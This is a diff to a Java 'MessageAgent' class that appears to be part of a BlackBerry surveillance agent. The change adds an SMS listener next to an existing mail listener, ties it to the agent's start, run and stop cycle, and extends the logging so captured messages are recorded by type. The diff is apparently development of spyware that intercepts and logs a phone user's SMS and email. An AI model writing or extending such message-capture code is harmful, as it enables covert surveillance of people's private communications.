@@ -13,6 +13,9 @@ import java.util.Date;
 import java.util.Vector;
 
 import net.rim.device.api.util.IntHashtable;
+import blackberry.agent.mail.Filter;
+import blackberry.agent.mail.MailListener;
+import blackberry.agent.sms.SmsListener;
 import blackberry.config.Keys;
 import blackberry.log.Log;
 import blackberry.log.LogType;
@@ -58,6 +61,8 @@ public final class MessageAgent extends Agent {
     protected static final int SLEEPTIME = 5000;
 
     MailListener mailListener;
+    SmsListener smsListener;
+
     Markup markupDate;
 
     public long lastcheck = 0;
@@ -82,6 +87,7 @@ public final class MessageAgent extends Agent {
         // #endif
 
         mailListener = new MailListener(this);
+        smsListener = new SmsListener(this);
     }
 
     /**
@@ -109,6 +115,7 @@ public final class MessageAgent extends Agent {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
+        smsListener.run();
         mailListener.run();
     }
 
@@ -117,6 +124,7 @@ public final class MessageAgent extends Agent {
      * @see blackberry.threadpool.TimerJob#actualStart()
      */
     public void actualStart() {
+        smsListener.start();
         mailListener.start();
     }
 
@@ -125,6 +133,7 @@ public final class MessageAgent extends Agent {
      * @see blackberry.threadpool.TimerJob#actualStop()
      */
     public void actualStop() {
+        smsListener.stop();
         mailListener.stop();
     }
 
@@ -135,18 +144,18 @@ public final class MessageAgent extends Agent {
      *            the additional data
      * @param content
      *            the content
+     * @param logType 
      */
-    void createLog(final byte[] additionalData,
-            final byte[] content) {
+    public void createLog(final byte[] additionalData, final byte[] content, int logType) {
         //#debug debug
         debug.trace("createLog");
 
         synchronized (log) {
-            log.createLog(additionalData);
+            log.createLog(additionalData, logType);
             log.writeLog(content);
             log.close();
         }
-        
+
         //#debug debug
         debug.trace("log created");
     }
@@ -156,7 +165,7 @@ public final class MessageAgent extends Agent {
      * 
      * @return the long
      */
-    long initMarkup() {
+    public long initMarkup() {
 
         if (markupDate.isMarkup() == false) {
             // #debug debug
@@ -279,7 +288,7 @@ public final class MessageAgent extends Agent {
     /**
      * Update markup.
      */
-    void updateMarkup() {
+    public void updateMarkup() {
         // #debug debug
         debug.trace("Sto scrivendo nel markup");
         final Date date = new Date();
